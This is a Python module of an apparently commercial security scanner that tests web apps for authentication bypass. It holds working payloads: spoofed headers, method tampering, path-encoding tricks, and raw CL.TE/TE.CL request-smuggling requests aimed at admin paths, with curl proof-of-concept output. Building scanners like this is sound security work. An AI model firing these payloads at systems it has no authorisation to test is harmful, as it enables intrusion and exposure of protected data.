"""
Authentication Bypass Scanner

Enterprise-grade authentication bypass testing including:
- Header manipulation bypass (X-Original-URL, X-Forwarded-For, etc.)
- HTTP method bypass
- Path manipulation bypass
- Case sensitivity bypass

CWE Coverage:
- CWE-287: Improper Authentication
- CWE-288: Authentication Bypass Using an Alternate Path or Channel

Author: PetNTester AI Enterprise
Version: 2.0.0
"""

from __future__ import annotations

import socket
import ssl
from typing import TYPE_CHECKING, Any
from urllib.parse import urljoin, urlparse

import httpx

from scanning.findings import Finding, Severity, VulnType
from utils.scan_client import get_scan_client
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter

from .auth_base import AUTH_BYPASS_HEADERS, PROTECTED_PATHS

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


def _is_real_bypass(normal_response, bypass_response) -> tuple[bool, str]:
    """Validate that a 200 response is a REAL bypass, not just a different error page.

    FIX 2026-02-12: 200 status alone is NOT proof of bypass.
    A real bypass must:
    1. Have different content from the normal response
    2. Contain meaningful data (not redirect/error pages)
    3. NOT be a generic SPA catch-all

    Returns: (is_bypass, evidence_reason)
    """
    if bypass_response.status_code != 200:
        return False, "not_200"

    bypass_body = bypass_response.text.lower() if hasattr(bypass_response, 'text') else ""
    normal_body = normal_response.text.lower() if hasattr(normal_response, 'text') else ""

    # Check 1: Body must be different
    if len(bypass_body) > 0 and len(normal_body) > 0:
        # If bodies are very similar (within 10%), likely same page
        if abs(len(bypass_body) - len(normal_body)) < min(len(bypass_body), len(normal_body)) * 0.1:
            # Check content hash
            import hashlib
            bypass_hash = hashlib.md5(bypass_body.encode()).hexdigest()
            normal_hash = hashlib.md5(normal_body.encode()).hexdigest()
            if bypass_hash == normal_hash:
                return False, "identical_content"

    # Check 2: Not a generic error/redirect page
    ERROR_PATTERNS = (
        "unauthorized", "forbidden", "access denied", "not allowed",
        "login required", "please sign in", "please log in", "redirect",
        "404", "not found", "error", "<!doctype", "<html",
    )
    has_error = any(p in bypass_body for p in ERROR_PATTERNS)

    # Check 3: Contains sensitive/protected data
    SENSITIVE_PATTERNS = (
        '"email"', '"user"', '"account"', '"admin"', '"role"',
        '"token"', '"password"', '"balance"', '"credit"', '"id":',
        '"data":', '"items":', '"results":', '"profile"', '"secret"',
        '"api_key"', '"private"', '"config"', '"settings"',
    )
    has_sensitive = any(p in bypass_body for p in SENSITIVE_PATTERNS)

    # Check 4: Response is JSON API (not HTML page)
    is_json = "application/json" in bypass_response.headers.get("content-type", "").lower()

    # Decision logic
    if has_sensitive and not has_error:
        return True, "contains_sensitive_data"
    elif is_json and len(bypass_body) > 50:
        return True, "json_api_response"
    elif has_error:
        return False, "error_page"
    elif len(bypass_body) < 50:
        return False, "too_short"

    # If none of the above, be conservative
    return False, "unverified"


class AuthBypassScanner:
    """
    Authentication Bypass Scanner

    Tests for authentication bypass using various techniques
    including header manipulation, method tampering, and path tricks.
    """

    def __init__(self, settings: Settings) -> None:
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0

    async def scan(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Comprehensive authentication bypass scan.
        """
        findings = []

        # Extended bypass testing
        bypass_findings = await self._check_auth_bypass_extended(
            base_url, asset_data, rate_limiter
        )
        findings.extend(bypass_findings)

        # Desync-aware bypass: When smuggling is available, test auth bypass via desync
        if isinstance(asset_data, dict) and asset_data.get("desync_enabled"):
            desync_findings = await self._check_auth_bypass_via_desync(
                base_url, asset_data, rate_limiter
            )
            findings.extend(desync_findings)

        return findings

    async def _check_auth_bypass_extended(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Extended authentication bypass testing."""
        findings = []

        async with get_scan_client(timeout=self.timeout, verify_ssl=False) as client:
            for path in PROTECTED_PATHS:
                await rate_limiter.acquire()

                url = urljoin(base_url, path)

                try:
                    # Normal request
                    normal_response = await client.get(url)

                    if normal_response.status_code not in [401, 403]:
                        continue

                    # Test header bypass
                    for headers in AUTH_BYPASS_HEADERS:
                        await rate_limiter.acquire()
                        bypass_response = await client.get(url, headers=headers)

                        # FIX 2026-02-12: Validate that 200 is a REAL bypass, not error page
                        is_bypass, bypass_evidence = _is_real_bypass(normal_response, bypass_response)
                        if bypass_response.status_code == 200 and is_bypass:
                            # Generate POC for header bypass
                            header_str = " ".join(f"-H '{k}: {v}'" for k, v in headers.items())
                            poc = {
                                "working_payload": str(headers),
                                "curl_command": f"curl -s {header_str} '{url}'",
                                "exploitation_steps": [
                                    f"1. Access {url} normally → {normal_response.status_code} (blocked)",
                                    f"2. Add bypass headers: {list(headers.keys())}",
                                    f"3. Access now returns {bypass_response.status_code} (allowed)",
                                    "4. Extract sensitive data from the protected endpoint",
                                ],
                                "impact_demo": "Full access to protected admin/internal endpoints without authentication",
                                "difficulty": "Easy",
                                "prerequisites": ["None - unauthenticated attack"],
                            }
                            findings.append(Finding(
                                vuln_type=VulnType.AUTH_BYPASS,
                                name="Authentication Bypass via Headers",
                                severity=Severity.CRITICAL,
                                description=f"Protected resource accessible with special headers. Evidence: {bypass_evidence}",
                                host=base_url,
                                endpoint=url,
                                evidence=[
                                    f"Normal: {normal_response.status_code}",
                                    f"Headers: {headers}",
                                    f"Bypass: {bypass_response.status_code}",
                                    f"Validation: {bypass_evidence}",
                                ],
                                cvss_score=9.8,
                                cwe_id="CWE-287",
                                remediation="Implement authentication at application level. "
                                           "Do not trust HTTP headers for auth decisions.",
                                metadata={"poc": poc},
                            ).to_dict())
                            # FN-FIX 2026-02-08: Don't break - test ALL bypass headers

                    # Test HTTP method bypass
                    bypass_methods = ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"]
                    for method in bypass_methods:
                        await rate_limiter.acquire()
                        try:
                            method_response = await client.request(method, url)
                            # FIX 2026-02-12: Validate that 200 is a REAL bypass
                            is_bypass, bypass_evidence = _is_real_bypass(normal_response, method_response)
                            if method_response.status_code == 200 and is_bypass:
                                # Generate POC for method bypass
                                poc = {
                                    "working_payload": f"HTTP {method} instead of GET",
                                    "curl_command": f"curl -s -X {method} '{url}'",
                                    "exploitation_steps": [
                                        f"1. Access {url} with GET → {normal_response.status_code} (blocked)",
                                        f"2. Change HTTP method to {method}",
                                        f"3. Access now returns {method_response.status_code} (allowed)",
                                        "4. Interact with protected endpoint using alternative method",
                                    ],
                                    "impact_demo": f"Access to protected endpoint via {method} method",
                                    "difficulty": "Easy",
                                    "prerequisites": ["None - unauthenticated attack"],
                                }
                                findings.append(Finding(
                                    vuln_type=VulnType.AUTH_BYPASS,
                                    name="Authentication Bypass via HTTP Method",
                                    severity=Severity.HIGH,
                                    description=f"Protected resource accessible via {method} method. Evidence: {bypass_evidence}",
                                    host=base_url,
                                    endpoint=url,
                                    evidence=[
                                        f"GET: {normal_response.status_code}",
                                        f"{method}: {method_response.status_code}",
                                        f"Validation: {bypass_evidence}",
                                    ],
                                    cvss_score=8.1,
                                    cwe_id="CWE-287",
                                    remediation="Apply authentication to all HTTP methods.",
                                    metadata={"poc": poc},
                                ).to_dict())
                                # FN-FIX 2026-02-08: Don't break - test ALL HTTP methods
                        except (httpx.HTTPError, httpx.TimeoutException, OSError):
                            continue

                    # Test path manipulation bypass (ENHANCED for API Gateway)
                    # These techniques target differences between gateway and backend path parsing
                    path_variants = [
                        # Basic trailing variations
                        path + "/",
                        path + "//",
                        path + "/./",
                        # URL encoding bypasses
                        path + "/%2e/",
                        path.replace("/", "%2f"),  # Encoded slash
                        path.replace("/", "%252f"),  # Double encoded slash
                        # Case sensitivity
                        path.upper(),
                        path.lower(),
                        path[0].upper() + path[1:],  # First char uppercase
                        # Suffix confusion
                        path + "?",
                        path + "#",
                        path + ";",
                        path + "%00",
                        path + ".json",
                        path + ".html",
                        path + ".css",  # Sometimes allowed by WAF rules
                        path + ".js",
                        path + "..;/",  # Tomcat path param
                        # Path traversal confusion
                        path + "/../" + path.split("/")[-1],
                        "/." + path,
                        "/.." + path,
                        # Unicode normalization bypass
                        path.replace("a", "%c0%a1") if "a" in path else path,
                        # HTTP parameter pollution
                        path + "?foo=bar",
                        path + "?__proto__=",
                        # Version API confusion
                        path.replace("/v1/", "/v2/") if "/v1/" in path else path,
                        path.replace("/api/", "/API/") if "/api/" in path else path,
                    ]

                    for variant in path_variants:
                        if variant == path:  # Skip if variant is same as original
                            continue
                        await rate_limiter.acquire()
                        variant_url = urljoin(base_url, variant)
                        try:
                            variant_response = await client.get(variant_url)
                            # FIX 2026-02-12: Validate that 200 is a REAL bypass
                            is_bypass, bypass_evidence = _is_real_bypass(normal_response, variant_response)
                            if variant_response.status_code == 200 and is_bypass:
                                # Generate POC for path manipulation bypass
                                poc = {
                                    "working_payload": variant,
                                    "curl_command": f"curl -s '{variant_url}'",
                                    "exploitation_steps": [
                                        f"1. Access {path} → {normal_response.status_code} (blocked)",
                                        f"2. Modify path to: {variant}",
                                        f"3. Access now returns {variant_response.status_code} (allowed)",
                                        "4. Access protected resources using path manipulation",
                                    ],
                                    "impact_demo": "Bypass authentication by manipulating URL path",
                                    "difficulty": "Easy",
                                    "prerequisites": ["None - unauthenticated attack"],
                                }
                                findings.append(Finding(
                                    vuln_type=VulnType.AUTH_BYPASS,
                                    name="Authentication Bypass via Path Manipulation",
                                    severity=Severity.HIGH,
                                    description=f"Protected resource accessible via path manipulation. Evidence: {bypass_evidence}",
                                    host=base_url,
                                    endpoint=variant_url,
                                    evidence=[
                                        f"Original: {path} -> {normal_response.status_code}",
                                        f"Validation: {bypass_evidence}",
                                        f"Bypass: {variant} -> {variant_response.status_code}",
                                    ],
                                    cvss_score=8.1,
                                    cwe_id="CWE-287",
                                    remediation="Normalize paths before authentication check. "
                                               "Use strict path matching.",
                                    metadata={"poc": poc},
                                ).to_dict())
                                # FN-FIX 2026-02-08: Don't break - test ALL path variants
                        except (httpx.HTTPError, httpx.TimeoutException, OSError):
                            continue

                    # =============================================================
                    # API GATEWAY SPECIFIC BYPASS TECHNIQUES (HIGH VALUE)
                    # These target differences between gateway and backend routing
                    # =============================================================

                    # Test Host header manipulation
                    host_bypass_headers = [
                        {"Host": "localhost"},
                        {"Host": "127.0.0.1"},
                        {"Host": "internal.local"},
                        {"X-Forwarded-Host": "localhost"},
                        {"X-Host": "localhost"},
                        {"X-Forwarded-Server": "localhost"},
                        # HTTP Request Smuggling related
                        {"Transfer-Encoding": "chunked", "Content-Length": "0"},
                    ]

                    for headers in host_bypass_headers:
                        await rate_limiter.acquire()
                        try:
                            host_response = await client.get(url, headers=headers)
                            # FIX 2026-02-12: Validate that 200 is a REAL bypass
                            is_bypass, bypass_evidence = _is_real_bypass(normal_response, host_response)
                            if host_response.status_code == 200 and is_bypass:
                                findings.append(Finding(
                                    vuln_type=VulnType.AUTH_BYPASS,
                                    name="API Gateway Bypass via Host Header",
                                    severity=Severity.CRITICAL,
                                    description=f"Protected endpoint accessible by manipulating Host header. "
                                               f"Evidence: {bypass_evidence}",
                                    host=base_url,
                                    endpoint=url,
                                    evidence=[
                                        f"Normal request: {normal_response.status_code}",
                                        f"With {list(headers.keys())[0]}: {host_response.status_code}",
                                        f"Headers used: {headers}",
                                        f"Validation: {bypass_evidence}",
                                    ],
                                    cvss_score=9.1,
                                    cwe_id="CWE-287",
                                    remediation="Do not trust Host headers for routing decisions. "
                                               "Validate Host header against allowlist at gateway level.",
                                    metadata={
                                        "poc": {
                                            "curl_command": f"curl -s -H '{list(headers.keys())[0]}: {list(headers.values())[0]}' '{url}'",
                                            "difficulty": "Easy",
                                        }
                                    },
                                ).to_dict())
                                break
                        except (httpx.HTTPError, httpx.TimeoutException, OSError):
                            continue

                    # Test HTTP method override headers (common gateway feature)
                    method_override_tests = [
                        {"X-HTTP-Method-Override": "GET"},
                        {"X-HTTP-Method": "GET"},
                        {"X-Method-Override": "GET"},
                        {"_method": "GET"},
                    ]

                    for headers in method_override_tests:
                        await rate_limiter.acquire()
                        try:
                            # Send POST but override to GET
                            override_response = await client.post(url, headers=headers)
                            # FIX 2026-02-12: Validate that 200 is a REAL bypass
                            is_bypass, bypass_evidence = _is_real_bypass(normal_response, override_response)
                            if override_response.status_code == 200 and normal_response.status_code in [401, 403] and is_bypass:
                                findings.append(Finding(
                                    vuln_type=VulnType.AUTH_BYPASS,
                                    name="API Gateway Method Override Bypass",
                                    severity=Severity.HIGH,
                                    description=f"Authentication bypassed using HTTP method override header. "
                                               f"Evidence: {bypass_evidence}",
                                    host=base_url,
                                    endpoint=url,
                                    evidence=[
                                        f"GET request: {normal_response.status_code}",
                                        f"POST with override header: {override_response.status_code}",
                                        f"Validation: {bypass_evidence}",
                                    ],
                                    cvss_score=8.1,
                                    cwe_id="CWE-287",
                                    remediation="Disable method override features in production. "
                                               "Apply auth checks after method override resolution.",
                                ).to_dict())
                                break
                        except (httpx.HTTPError, httpx.TimeoutException, OSError):
                            continue

                except (httpx.HTTPError, httpx.TimeoutException, OSError) as e:
                    logger.debug(f"Auth bypass check failed for {url}: {e}")

        return findings

    async def _check_auth_bypass_via_desync(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Test auth bypass via HTTP request smuggling/desync.

        When desync is available (from smuggling_scanner findings), smuggled requests
        may bypass front-end authentication checks that the backend doesn't see.
        """
        findings = []
        desync_type = asset_data.get("desync_type", "CL.TE") if isinstance(asset_data, dict) else "CL.TE"

        parsed = urlparse(base_url)
        hostname = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"

        # Admin paths that may be protected by frontend only
        admin_paths = ["/admin", "/api/admin", "/internal", "/dashboard", "/management"]

        for path in admin_paths:
            await rate_limiter.acquire()

            try:
                # Build smuggled request based on desync type
                if desync_type in ("CL.TE", "cl_te"):
                    # CL.TE: Frontend uses Content-Length, Backend uses Transfer-Encoding
                    smuggled = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {hostname}\r\n"
                        f"\r\n"
                    )
                    request = (
                        f"POST / HTTP/1.1\r\n"
                        f"Host: {hostname}\r\n"
                        f"Content-Length: {len(smuggled)}\r\n"
                        f"Transfer-Encoding: chunked\r\n"
                        f"\r\n"
                        f"0\r\n"
                        f"\r\n"
                        f"{smuggled}"
                    )
                else:  # TE.CL
                    # TE.CL: Frontend uses Transfer-Encoding, Backend uses Content-Length
                    smuggled_len = len(f"GET {path} HTTP/1.1\r\nHost: {hostname}\r\n\r\n")
                    request = (
                        f"POST / HTTP/1.1\r\n"
                        f"Host: {hostname}\r\n"
                        f"Content-Length: 4\r\n"
                        f"Transfer-Encoding: chunked\r\n"
                        f"\r\n"
                        f"{smuggled_len:x}\r\n"
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {hostname}\r\n"
                        f"\r\n"
                        f"0\r\n"
                        f"\r\n"
                    )

                response = await self._send_raw_request(
                    hostname, port, use_ssl, request
                )

                # Check if we got admin content in response
                if response and self._looks_like_admin_access(response):
                    findings.append(Finding(
                        vuln_type=VulnType.AUTH_BYPASS,
                        name=f"Auth Bypass via HTTP Smuggling ({desync_type})",
                        severity=Severity.CRITICAL,
                        confidence_score=90.0,
                        description=(
                            f"Authentication bypassed using HTTP request smuggling ({desync_type}). "
                            f"The frontend authenticates requests, but the smuggled request reaches "
                            f"the backend directly, bypassing authentication checks."
                        ),
                        host=base_url,
                        endpoint=f"{base_url}{path}",
                        evidence=[
                            f"Desync type: {desync_type}",
                            f"Smuggled path: {path}",
                            f"Response indicates admin access",
                            f"Response preview: {response[:500]}...",
                        ],
                        cvss_score=9.8,
                        cwe_id="CWE-444",
                        remediation=(
                            "Fix the HTTP smuggling vulnerability first. "
                            "Ensure both frontend and backend use consistent HTTP parsing. "
                            "Implement authentication at the backend level, not just the gateway."
                        ),
                        metadata={
                            "desync_type": desync_type,
                            "smuggled_path": path,
                            "can_chain": True,
                            "bypass_waf": True,
                        },
                    ).to_dict())
                    logger.info(f"[AUTH_BYPASS] Found desync auth bypass: {path}")
                    break  # Found one, stop testing

            except Exception as e:
                logger.debug(f"[AUTH_BYPASS] Desync test failed for {path}: {e}")

        return findings

    async def _send_raw_request(
        self,
        hostname: str,
        port: int,
        use_ssl: bool,
        request: str,
        timeout: float = 10.0,
    ) -> str:
        """Send raw HTTP request via socket."""
        import asyncio

        def _sync_send():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            try:
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=hostname)

                sock.connect((hostname, port))
                sock.sendall(request.encode())

                response = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                except socket.timeout:
                    pass

                return response.decode("utf-8", errors="ignore")
            finally:
                sock.close()

        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, _sync_send)

    def _looks_like_admin_access(self, response: str) -> bool:
        """Check if response indicates successful admin access."""
        if "HTTP/1." not in response:
            return False

        # Check for 200 OK
        if " 200 " not in response and " 200\r\n" not in response:
            return False

        # Look for admin-related content
        admin_indicators = [
            "dashboard", "admin", "management", "settings", "users",
            "configuration", "\"role\"", "\"admin\"", "\"permissions\"",
            "delete", "modify", "create", "user_id",
        ]

        response_lower = response.lower()
        return any(indicator in response_lower for indicator in admin_indicators)
